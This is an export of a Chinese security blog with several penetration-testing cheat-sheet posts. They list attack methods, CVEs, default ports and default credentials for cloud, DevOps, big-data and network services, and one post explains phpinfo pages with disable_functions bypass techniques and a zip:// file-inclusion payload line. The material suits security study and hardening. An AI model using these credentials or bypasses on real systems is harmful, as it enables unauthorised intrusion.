<h3 id="2、OpenStack"><a href="#2、OpenStack" class="headerlink" title="2、OpenStack"></a>2、OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</span><br><span class="line">•   权限绕过漏洞</span><br><span class="line">•   信息泄露</span><br><span class="line">•   代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/news/topnews/107203.html</span><br></pre></td></tr></table></figure>
<h3 id="3、Docker"><a href="#3、Docker" class="headerlink" title="3、Docker"></a>3、Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
<p>Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。</p>
<p>Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。</p>
<p>从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</span><br><span class="line">•   CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</span><br><span class="line">•   CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</span><br><span class="line">•   CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</span><br><span class="line">•   CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</span><br><span class="line">•   内核漏洞（Kernel exploits）容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</span><br><span class="line">•   拒绝服务攻击（Denial-of-service attacks）所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</span><br><span class="line">•   容器突破（Container breakouts）Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</span><br><span class="line">•   有毒镜像（Poisoned images）主要是考虑到镜像本身的安全性，没太多好说的。</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://toutiao.io/posts/2y9xx8/preview</span><br><span class="line"></span><br><span class="line">http://www.yunweipai.com/archives/21610.html</span><br><span class="line"></span><br><span class="line">http://www.91ri.org/15837.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/ruidu_doer/article/details/53401523</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://dockone.io/article/150</span><br><span class="line"></span><br><span class="line">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</span><br><span class="line"></span><br><span class="line">https://blog.waterstrong.me/docker-security/</span><br></pre></td></tr></table></figure>

































]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（二）渗透技巧—常见运维系统</title>
    <url>/2019/04/15/%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E8%BF%90%E7%BB%B4%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<p>一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。<br>内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。</p>
<h3 id="1、Gitlab"><a href="#1、Gitlab" class="headerlink" title="1、Gitlab"></a>1、Gitlab</h3><p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意文件读取漏洞</span><br><span class="line">•   意用户 token 泄露漏洞</span><br><span class="line">•   命令执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/</span><br><span class="line"></span><br><span class="line">http://rinige.com/index.php/archives/577/</span><br></pre></td></tr></table></figure>
<h3 id="2、Jenkins"><a href="#2、Jenkins" class="headerlink" title="2、Jenkins"></a>2、Jenkins</h3><p>Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   未授权访问漏洞</span><br><span class="line">•   登录入口爆破</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.cnblogs.com/backlion/p/6813260.html</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/86018</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/199/</span><br></pre></td></tr></table></figure>
<h3 id="3、Puppet"><a href="#3、Puppet" class="headerlink" title="3、Puppet"></a>3、Puppet</h3><p>Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   可利用漏洞，很少公开的POC</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程命令执行</span><br></pre></td></tr></table></figure>
<h3 id="4、Ansible"><a href="#4、Ansible" class="headerlink" title="4、Ansible"></a>4、Ansible</h3><p>Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行</span><br></pre></td></tr></table></figure>
<h3 id="5、Nagios"><a href="#5、Nagios" class="headerlink" title="5、Nagios"></a>5、Nagios</h3><p>Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   代码执行</span><br><span class="line">•   SQLi</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.bugku.com/thread-87-1-1.html</span><br><span class="line">http://www.mottoin.com/93936.html</span><br></pre></td></tr></table></figure>
<h3 id="6、Zabbix"><a href="#6、Zabbix" class="headerlink" title="6、Zabbix"></a>6、Zabbix</h3><p>Zabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞（具体参考 ExploitDB）：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   shell 命令注入</span><br><span class="line">•   认证绕过</span><br><span class="line">•   默认账户与密码，默认口令 admin/zabbix，或者是guest/空</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://blog.csdn.net/ytuo1223/article/details/45937981</span><br><span class="line"></span><br><span class="line">http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/87570.html</span><br></pre></td></tr></table></figure>
<h3 id="7、Cacit"><a href="#7、Cacit" class="headerlink" title="7、Cacit"></a>7、Cacit</h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   登录爆破</span><br><span class="line">•   默认密码admin/admin</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html</span><br></pre></td></tr></table></figure>
<h3 id="8、Splunk"><a href="#8、Splunk" class="headerlink" title="8、Splunk"></a>8、Splunk</h3><p>Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   信息泄露</span><br><span class="line">•   命令注入</span><br><span class="line">•   服务端请求伪造</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">ExploitDB 搜索</span><br></pre></td></tr></table></figure>

























]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（六）渗透技巧—大数据</title>
    <url>/2019/04/15/%EF%BC%88%E5%85%AD%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h3 id="1、Elsaticsearch"><a href="#1、Elsaticsearch" class="headerlink" title="1、Elsaticsearch"></a>1、Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：9200、9300</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   未授权访问；</span><br><span class="line">•   远程命令执行；</span><br><span class="line">•   文件遍历；</span><br><span class="line">•   低版本webshell植入；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/sectool/38025.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/5401.html</span><br></pre></td></tr></table></figure>
<h3 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p>
<p>Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
<p>用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://tech.meituan.com/hadoop-security-practice.html</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/33525241</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/85343</span><br><span class="line"></span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</span><br></pre></td></tr></table></figure>
<h3 id="3、Hive"><a href="#3、Hive" class="headerlink" title="3、Hive"></a>3、Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://cwiki.apache.org/confluence/display/Hive/Security</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yejibigdata/p/6394719.html</span><br></pre></td></tr></table></figure>
<h3 id="4、Sqoop"><a href="#4、Sqoop" class="headerlink" title="4、Sqoop"></a>4、Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。</p>
<p>用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://sqoop.apache.org/docs/1.99.7/security.html</span><br></pre></td></tr></table></figure>
<h3 id="5、HBase"><a href="#5、HBase" class="headerlink" title="5、HBase"></a>5、HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。</p>
<p>它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。</p>
<p>与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</span><br></pre></td></tr></table></figure>
<h3 id="6、Spark"><a href="#6、Spark" class="headerlink" title="6、Spark"></a>6、Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</span><br></pre></td></tr></table></figure>




























]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（四）渗透技巧—常见服务、协议</title>
    <url>/2019/04/15/%EF%BC%88%E5%9B%9B%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E3%80%81%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h3 id="1、FTP-服务"><a href="#1、FTP-服务" class="headerlink" title="1、FTP 服务"></a>1、FTP 服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：</span><br><span class="line">20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；</span><br><span class="line">•   匿名访问：用户名：anonymous 密码：为空或任意邮箱</span><br><span class="line">•   嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</span><br><span class="line">•   后门 vsftp</span><br><span class="line">•   远程溢出</span><br><span class="line">•   跳转攻击</span><br></pre></td></tr></table></figure>
<h3 id="2、NFS-服务"><a href="#2、NFS-服务" class="headerlink" title="2、NFS 服务"></a>2、NFS 服务</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•未授权访问</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/articles/network/159468.html</span><br><span class="line"></span><br><span class="line">http://www.vuln.cn/6368</span><br></pre></td></tr></table></figure>
<h3 id="3、Samba服务"><a href="#3、Samba服务" class="headerlink" title="3、Samba服务"></a>3、Samba服务</h3><p>Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   弱口令</span><br><span class="line">•   未授权访问（public）</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.91ri.org/17114.html</span><br></pre></td></tr></table></figure>
<h3 id="4、SSH-服务"><a href="#4、SSH-服务" class="headerlink" title="4、SSH 服务"></a>4、SSH 服务</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：22</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   后门</span><br><span class="line">•   漏洞：28退格漏洞、OpenSSL漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://cloud.tencent.com/developer/article/1078187</span><br></pre></td></tr></table></figure>
<h3 id="5、Telnet-服务"><a href="#5、Telnet-服务" class="headerlink" title="5、Telnet 服务"></a>5、Telnet 服务</h3><p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。<br>終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：21</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   嗅探</span><br></pre></td></tr></table></figure>
<h3 id="6、Windows-远程连接（rdp）"><a href="#6、Windows-远程连接（rdp）" class="headerlink" title="6、Windows 远程连接（rdp）"></a>6、Windows 远程连接（rdp）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：3389</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   Shift粘滞键后门：5次shift后门</span><br><span class="line">•   利用ms12-020攻击3389端口</span><br><span class="line">•   CVE-2019-0708</span><br></pre></td></tr></table></figure>
<h3 id="7、VNC服务"><a href="#7、VNC服务" class="headerlink" title="7、VNC服务"></a>7、VNC服务</h3><p>VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：</span><br><span class="line">5900+桌面ID（5901；5902）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   认证口令绕过：</span><br><span class="line">•   拒绝服务攻击：（CVE-2015-5239）</span><br><span class="line">•   权限提升：（CVE-2013-6886）</span><br></pre></td></tr></table></figure>
<h3 id="8、SMTP协议"><a href="#8、SMTP协议" class="headerlink" title="8、SMTP协议"></a>8、SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：25（smtp）、465（smtps）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   未授权访问</span><br></pre></td></tr></table></figure>
<h3 id="9、POP3协议"><a href="#9、POP3协议" class="headerlink" title="9、POP3协议"></a>9、POP3协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：109（POP2）、110（POP3）、995（POP3S）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破；弱口令</span><br><span class="line">•   未授权访问</span><br></pre></td></tr></table></figure>
<h3 id="10、DNS服务"><a href="#10、DNS服务" class="headerlink" title="10、DNS服务"></a>10、DNS服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：53</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   区域传输漏洞</span><br></pre></td></tr></table></figure>
<h3 id="11、IMAP协议"><a href="#11、IMAP协议" class="headerlink" title="11、IMAP协议"></a>11、IMAP协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：143（imap）、993（imaps）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   配置不当</span><br></pre></td></tr></table></figure>
<h3 id="12、SNMP协议"><a href="#12、SNMP协议" class="headerlink" title="12、SNMP协议"></a>12、SNMP协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：161</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br></pre></td></tr></table></figure>
<h3 id="13、DHCP服务"><a href="#13、DHCP服务" class="headerlink" title="13、DHCP服务"></a>13、DHCP服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：67&amp;68、546（DHCP Failover做双机热备的）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   DHCP劫持</span><br></pre></td></tr></table></figure>





















]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>phpinfo正确食用方式</title>
    <url>/2019/03/18/phpinfo%E6%AD%A3%E7%A1%AE%E9%A3%9F%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p>在我们平时的渗透、ctf的过程中，或多或少会碰到phpinfo页面。但是这个页面包含的信息太多，常常感觉无从下手，在这里总结一下，可能没有那么全面。</p><a id="more"></a>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><h3 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h3><p><img src="https://i.loli.net/2019/11/11/Rj47CQgI6SJwEHB.png" alt="20190226215040.png"><br>这是最基本的，php更新速度非常快，各版本都有一些小特性。<br><a href="http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html</a><br><img src="https://i.loli.net/2019/11/11/9E25qCF3QLiufkY.png" alt="20190226215142.png"></p>
<h3 id="SYSTEM-INFO"><a href="#SYSTEM-INFO" class="headerlink" title="SYSTEM INFO"></a>SYSTEM INFO</h3><p><img src="https://i.loli.net/2019/11/11/vkIrC6tALWQlJHb.png" alt="he8ch44f3e.png"><br>详细的操作系统信息，为提权做准备</p>
<h3 id="SERVER-API"><a href="#SERVER-API" class="headerlink" title="SERVER API"></a>SERVER API</h3><p><img src="https://i.loli.net/2019/11/11/AVCN4EcZI9Wdf26.png" alt="20190226221734.png"><br>php解释器与应用层的桥梁。</p>
<p>1、FPM/FastCGI 多用于和nginx通信，当然也可用于其他web中间件。<br>Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写<br><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a><br>2、Apache 2.0 Handler php为apache提供的专用SAPI<br>3、Command Line Interface php命令行<br>4、CGI/FastCGI 碰见的几次都是用于iis</p>
<h3 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h3><p><img src="https://i.loli.net/2019/11/11/ckDnU3iNVtXwTHI.png" alt="20190226220548.png"><br>某些情况下可以加载自己的扩展。</p>
<h3 id="REGISTERED-PHP-STREAMS-AND-FILTERS"><a href="#REGISTERED-PHP-STREAMS-AND-FILTERS" class="headerlink" title="REGISTERED PHP STREAMS AND FILTERS"></a>REGISTERED PHP STREAMS AND FILTERS</h3><p>常见的就不说了。</p>
<p>1、phar<br>利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php<br>phar反序列化<br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p>2、gopher<br>利用 Gopher 协议拓展攻击面<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p>
<p>3、dict<br>探测为主</p>
<p><img src="https://i.loli.net/2019/11/11/tinOWDju5Yl2vAH.png" alt="20190226233652.png"></p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
<h2 id="核心配置"><a href="#核心配置" class="headerlink" title="核心配置"></a>核心配置</h2><h3 id="EXTENSION-DIR"><a href="#EXTENSION-DIR" class="headerlink" title="EXTENSION_DIR"></a>EXTENSION_DIR</h3><p><img src="https://i.loli.net/2019/11/11/E9e56f2YcrSCjQV.png" alt="bjlfkkafag.png"><br>php扩展的路径</p>
<h3 id="ALLOW-URL-INCLUDE"><a href="#ALLOW-URL-INCLUDE" class="headerlink" title="ALLOW_URL_INCLUDE"></a>ALLOW_URL_INCLUDE</h3><p>远程文件包含，但是一般不会开启</p>
<h3 id="ASP-TAGS"><a href="#ASP-TAGS" class="headerlink" title="ASP_TAGS"></a>ASP_TAGS</h3><p><img src="https://i.loli.net/2019/11/11/XqBV1DGndP8SKwy.png" alt="0g7c7mmj2i.png"></p>
<p>php标签有4种形式，如果这个选项不开启的话，使用asp的标签是不会解析的。<br>当<?php ?>标签被过滤时，可以通过.user.ini来覆盖php.ini中的配置。.user.ini在nginx等其他web中间件中也是有效的，应用范围比.htaccess广。<br>注意： 在PHP 7已经完全移除了这种标签</p>
<h3 id="SHORT-OPEN-TAG"><a href="#SHORT-OPEN-TAG" class="headerlink" title="SHORT_OPEN_TAG"></a>SHORT_OPEN_TAG</h3><p><img src="https://i.loli.net/2019/11/11/Q18x63hjgnSpU7w.png" alt="h4bgafaced.png"></p>
<p>还是标签的问题，允许<??>这种形式，并且&lt;?=等价于&lt;? echo</p>
<h3 id="DISABLE-FUNCTIONS"><a href="#DISABLE-FUNCTIONS" class="headerlink" title="DISABLE_FUNCTIONS"></a>DISABLE_FUNCTIONS</h3><p><img src="https://i.loli.net/2019/11/11/3xgjStRcmovGLHW.png" alt="mf8ekjh0mj.png"></p>
<p>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。<br>绕过的方式有这么几个：</p>
<p>1、黑名单绕过：<br>百密一疏，寻找黑名单中漏掉的函数，上图中禁用的函数算是比较全的了。<br>比如在编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。</p>
<p>2、利用扩展（如ImageMagick）绕过<br>利用ImageMagick漏洞绕过disable_function</p>
<p>3、利用环境变量LD_PRELOAD来绕过<br>利用环境变量LD_PRELOAD来绕过php disable_function<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>4、利用扩展库绕过<br><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">http://www.91ri.org/8700.html</a><br>一个综合：<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p>
